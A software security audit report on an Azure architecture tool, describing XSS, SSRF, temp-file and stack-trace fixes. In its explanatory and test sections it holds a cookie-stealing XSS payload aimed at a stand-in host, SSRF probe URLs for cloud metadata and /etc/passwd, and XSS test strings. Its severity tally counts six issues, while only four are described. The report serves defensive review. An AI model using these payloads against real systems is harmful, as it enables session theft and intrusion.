# Security Audit Report

**Date:** January 2025
**Audited By:** Security Review
**Status:** Remediated

---

## Executive Summary

A comprehensive security audit was performed on the Azure Architecture Categoriser codebase. The audit identified **6 vulnerability categories** across the web frontend, PDF generation, and CLI components. All identified issues have been remediated.

### Severity Distribution

| Severity | Count | Status |
|----------|-------|--------|
| High | 2 | Fixed |
| Medium | 3 | Fixed |
| Low | 1 | Fixed |

---

## Vulnerabilities Identified and Remediated

### 1. Cross-Site Scripting (XSS) - HIGH

**Affected Files:**
- `src/architecture_recommendations_app/Recommendations.py`
- `src/architecture_recommendations_app/components/results_display.py`

**Issue:**
User-controlled data from uploaded JSON context files was directly interpolated into HTML rendered with Streamlit's `unsafe_allow_html=True` parameter. This allowed potential JavaScript injection through malicious JSON files.

**Vulnerable Patterns:**
```python
# BEFORE: User data directly in HTML
st.markdown(f"<span>{app_name}</span>", unsafe_allow_html=True)
st.markdown(f"<span>{tech}</span>", unsafe_allow_html=True)
st.markdown(f"<a href='{url}'>{answer_label}</a>", unsafe_allow_html=True)
```

**Exploitation:**
An attacker could craft a JSON file containing:
```json
{
  "app_overview": [{
    "application": "<img src=x onerror='document.location=\"http://evil.com/?c=\"+document.cookie'>"
  }]
}
```

**Remediation:**
Created `src/architecture_recommendations_app/utils/sanitize.py` with:
- `safe_html()` - HTML entity escaping for content
- `safe_html_attr()` - Attribute-safe escaping
- `validate_url()` - URL validation against domain allowlist

All user data is now escaped before HTML interpolation:
```python
# AFTER: User data is escaped
st.markdown(f"<span>{safe_html(app_name)}</span>", unsafe_allow_html=True)
```

**Files Modified:**
- `src/architecture_recommendations_app/utils/sanitize.py` (NEW)
- `src/architecture_recommendations_app/utils/__init__.py`
- `src/architecture_recommendations_app/Recommendations.py` (lines 883-987)
- `src/architecture_recommendations_app/components/results_display.py` (multiple)

---

### 2. Server-Side Request Forgery (SSRF) - MEDIUM

**Affected Files:**
- `src/architecture_recommendations_app/components/pdf_generator.py`
- `src/architecture_recommendations_app/components/results_display.py`

**Issue:**
The PDF generator fetched diagram images from URLs in catalog data without validation. Malicious catalog entries could point to internal resources.

**Vulnerable Pattern:**
```python
# BEFORE: Arbitrary URL fetching
response = requests.get(rec.diagram_url, timeout=10)
```

**Exploitation:**
A malicious catalog entry with `diagram_url: "http://169.254.169.254/latest/meta-data/"` could access cloud metadata endpoints.

**Remediation:**
Implemented URL validation with domain allowlist:
```python
# AFTER: URL validation before fetching
url_valid, _ = validate_url(rec.diagram_url, allow_http=True)
if url_valid:
    response = requests.get(rec.diagram_url, timeout=10)
```

**Allowed Domains:**
- `microsoft.com`, `azure.com` (and subdomains)
- `learn.microsoft.com`, `docs.microsoft.com`
- `azureedge.net`, `akamaized.net` (CDN)
- `github.com`, `githubusercontent.com`

**Blocked:**
- Private IP ranges (RFC 1918, loopback, link-local)
- Cloud metadata endpoints (`169.254.169.254`, etc.)
- Non-HTTPS URLs (unless explicitly allowed)

**Files Modified:**
- `src/architecture_recommendations_app/utils/sanitize.py` (URL validation)
- `src/architecture_recommendations_app/components/pdf_generator.py`
- `src/architecture_recommendations_app/components/results_display.py`

---

### 3. Insecure Temporary File Handling - MEDIUM

**Affected Files:**
- `src/architecture_recommendations_app/Recommendations.py`

**Issue:**
Temporary files were created with predictable names in world-readable locations:
```python
# BEFORE: Predictable temp file path
temp_catalog = Path(tempfile.gettempdir()) / "uploaded-architecture-catalog.json"
```

**Risks:**
- Symlink attacks
- Race conditions (time-of-check to time-of-use)
- Information disclosure on shared systems
- Files persisting after process crash

**Remediation:**
Created secure temp file utilities with:
- Random file names via `tempfile.mkstemp()`
- Restrictive permissions (`0o600`)
- Automatic cleanup via context managers

```python
# AFTER: Secure temp file with auto-cleanup
with secure_temp_file(suffix='.json') as (f, temp_path):
    json.dump(data, f)
    # File automatically deleted after this block
```

**Files Modified:**
- `src/architecture_recommendations_app/utils/sanitize.py` (secure_temp_file, secure_temp_directory)
- `src/architecture_recommendations_app/Recommendations.py` (lines 360-365, 1007-1025, 1028-1045)

---

### 4. Information Disclosure via Stack Traces - LOW

**Affected Files:**
- `src/catalog_builder_gui/components/preview_panel.py`
- `src/catalog_builder/cli.py`

**Issue:**
Full Python stack traces were displayed to users on error, potentially revealing:
- Internal file paths
- Code structure
- Variable values
- System information

**Vulnerable Pattern:**
```python
# BEFORE: Unconditional traceback display
import traceback
st.code(traceback.format_exc())
```

**Remediation:**
Stack traces are now controlled by environment variable:
```python
# AFTER: Debug mode required for tracebacks
if _is_debug_mode():  # CATALOG_BUILDER_DEBUG=1
    import traceback
    with st.expander("Debug Details"):
        st.code(traceback.format_exc())
```

The CLI already used `--verbose` flag correctly.

**Files Modified:**
- `src/catalog_builder_gui/components/preview_panel.py`

---

## Security Utilities Added

### sanitize.py Module

Located at: `src/architecture_recommendations_app/utils/sanitize.py`

**Functions:**

| Function | Purpose |
|----------|---------|
| `safe_html(value)` | Escape value for HTML content |
| `safe_html_attr(value)` | Escape value for HTML attributes |
| `validate_url(url, domains, allow_http)` | Validate URL against allowlist |
| `safe_url(url, domains)` | Returns URL if valid, None otherwise |
| `secure_temp_file(suffix, prefix)` | Context manager for secure temp files |
| `secure_temp_directory(prefix)` | Context manager for secure temp directories |
| `sanitize_filename(filename)` | Remove path traversal characters |

**Configuration:**

| Constant | Description |
|----------|-------------|
| `ALLOWED_URL_DOMAINS` | Frozenset of allowed domain suffixes |
| `BLOCKED_IP_RANGES` | List of blocked IP networks (RFC 1918, etc.) |
| `BLOCKED_HOSTNAMES` | Frozenset of blocked hostnames (metadata endpoints) |

---

## Testing Recommendations

### XSS Testing
```json
// Test payloads for context file fields
{
  "app_overview": [{
    "application": "<script>alert('xss')</script>",
    "app_type": "<img src=x onerror=alert(1)>",
    "business_criticality": "\"onclick=\"alert(1)"
  }],
  "detected_technology_running": [
    "<svg onload=alert(1)>",
    "Normal Tech",
    "javascript:alert(1)"
  ]
}
```

### SSRF Testing
Verify these URLs are blocked in PDF generation:
- `http://169.254.169.254/latest/meta-data/`
- `http://127.0.0.1:8080/admin`
- `http://localhost/secret`
- `file:///etc/passwd`
- `http://internal-server.corp/`

### Temp File Testing
On Linux/macOS, verify temp files:
```bash
# Check permissions (should be 0600)
ls -la /tmp/context_*.json

# Verify no predictable names
ls /tmp/uploaded-architecture-catalog.json  # Should not exist
```

---

## Deployment Recommendations

### Environment Variables

| Variable | Purpose | Default |
|----------|---------|---------|
| `CATALOG_BUILDER_DEBUG` | Enable stack traces | `false` |
| `ARCHITECTURE_CATALOG_PATH` | Custom catalog location | Auto-detect |

### Production Checklist

- [ ] Ensure `CATALOG_BUILDER_DEBUG` is NOT set in production
- [ ] Review ALLOWED_URL_DOMAINS if custom diagram sources needed
- [ ] Monitor for failed URL validations in logs
- [ ] Implement rate limiting on file uploads
- [ ] Consider Content Security Policy headers if embedding in iframe

---

## Remaining Considerations

### Out of Scope (Accepted Risks)

1. **YAML Processing**: Uses `yaml.safe_load()` - already secure against arbitrary code execution

2. **Subprocess Calls**: Uses list arguments (not shell=True) - safe from injection. ExecutionPolicy Bypass used for PowerShell launch scripts with hardcoded paths only.

3. **SVG Processing**: `svglib` library used for SVG-to-PDF conversion. Keep dependency updated for XXE patches.

### Future Improvements

1. **Rate Limiting**: Consider adding rate limits on context file uploads
2. **File Type Validation**: Add MIME type checking for uploaded files
3. **Audit Logging**: Log security-relevant events (failed validations, blocked URLs)
4. **CSP Headers**: If deploying behind a reverse proxy, add Content-Security-Policy

---

## Change Summary

| File | Changes |
|------|---------|
| `utils/sanitize.py` | NEW - Security utilities |
| `utils/__init__.py` | Export sanitization functions |
| `Recommendations.py` | XSS fixes, secure temp files |
| `results_display.py` | XSS fixes, URL validation |
| `pdf_generator.py` | SSRF protection |
| `preview_panel.py` | Conditional stack traces |

---

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [Python tempfile Security](https://docs.python.org/3/library/tempfile.html#tempfile.mkstemp)
